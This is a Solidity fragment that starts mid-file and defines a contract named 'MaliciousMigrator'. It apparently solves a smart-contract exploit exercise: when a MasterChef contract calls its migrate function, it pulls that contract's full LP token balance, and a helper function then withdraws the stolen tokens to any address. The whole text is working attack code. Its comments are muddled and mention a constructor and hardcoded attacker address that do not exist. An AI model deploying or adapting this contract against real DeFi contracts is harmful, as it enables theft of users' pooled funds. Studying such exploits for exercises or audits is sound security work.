}

contract MaliciousMigrator {
    address public lpTokenAddress;
    uint256 public stolenAmount;

    // This function will be called by MasterChef's migrate()
    function migrate(address lpToken) external {
        lpTokenAddress = lpToken;
        // Get MasterChef's balance of this lpToken
        uint256 balance = IERC20(lpToken).balanceOf(msg.sender);
        stolenAmount = balance;

        if (balance > 0) {
            // Transfer from MasterChef to attacker (tx.origin or hardcoded)
            // Note: MasterChef must have approved this migrator or use transferFrom
            // In the exploit hint, it says migrator calls transferFrom
            // So we need to have MasterChef's approval first
            // Actually, the vulnerability is that MasterChef calls migrator.migrate(lpToken)
            // and the migrator can then call transferFrom(MasterChef, attacker, balance)
            // This requires MasterChef to have given allowance to migrator
            // Let's assume MasterChef has done that as part of the vulnerability

            // Transfer to the attacker (we'll use a hardcoded attacker address)
            // We'll store attacker address in constructor
            IERC20(lpToken).transferFrom(msg.sender, address(this), balance);
        }
    }

    // Helper to withdraw stolen tokens to a specific address
    function withdrawTokens(address token, address to) external {
        uint256 balance = IERC20(token).balanceOf(address(this));
        require(IERC20(token).transfer(to, balance), "Transfer failed");
    }
}

